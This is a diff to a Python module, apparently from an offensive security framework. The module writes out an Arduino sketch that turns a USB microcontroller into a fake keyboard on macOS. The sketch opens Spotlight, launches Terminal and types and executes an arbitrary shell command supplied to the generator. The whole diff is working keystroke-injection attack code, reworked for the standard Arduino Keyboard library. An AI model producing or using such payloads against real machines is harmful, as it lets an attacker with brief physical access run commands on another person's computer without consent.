@@ -23,7 +23,7 @@ import os, time
 
 class payload:
 	def __init__(self):
-		self.name = "Teensy macOS payload"
+		self.name = "Arduino macOS payload"
 		self.description = "Arduino payload that replicates keystrokes for shell script execution."
 		self.usage = "Install via arduino."
 
@@ -42,44 +42,43 @@ class payload:
 		if os.path.exists("payloads/teensy_macos") == False:
 			os.mkdir("payloads/teensy_macos")
 		payload_save_path = "payloads/teensy_macos/teensy_macos.ino"
-		payload = """\
+		payload = """
 #include "Keyboard.h"
-const int LED = 13;
-void setup() {
-	pinMode(LED, OUTPUT);
-	Serial.begin(9600);
-	delay(1000); //delay to establish connection
-	Keyboard.set_modifier(MODIFIERKEY_GUI);
-	Keyboard.set_key1(KEY_SPACE);
-	Keyboard.send_now();
-	Keyboard.set_modifier(0);
-	Keyboard.set_key1(0);
-	Keyboard.send_now();
-	delay(200);
-	Keyboard.print("terminal");
-	delay(1000);
-	keyEnter();
-	delay(1000);
-	Keyboard.print(\""""+shell_command+"""\");
-	keyEnter();
+
+void typeKey(uint8_t key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
 }
 
-void keyEnter() {
-	Keyboard.set_key1(KEY_ENTER);
-	Keyboard.send_now();
-	//release
-	Keyboard.set_key1(0);
-	Keyboard.send_now();
+void setup()
+{
+  Keyboard.begin();
+
+  delay(500);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(' ');
+  Keyboard.releaseAll();
+
+  delay(500);
+  Keyboard.print(F("terminal"));
+
+  delay(500);
+  typeKey(KEY_RETURN);
+
+  delay(500);
+  Keyboard.print(F(\""""+shell_command+"""\"));
+
+  delay(500);
+  typeKey(KEY_RETURN);
+
+  Keyboard.end();
 }
 
-void loop() {
-	digitalWrite(LED, HIGH);
-	delay(100);
-	digitalWrite(LED, LOW);
-	delay(100);
-}"""
+void loop() {}"""
 		f = open(payload_save_path,"w")
 		f.write(payload)
 		f.close()
 		h.info_general("Payload saved to " + payload_save_path)
-
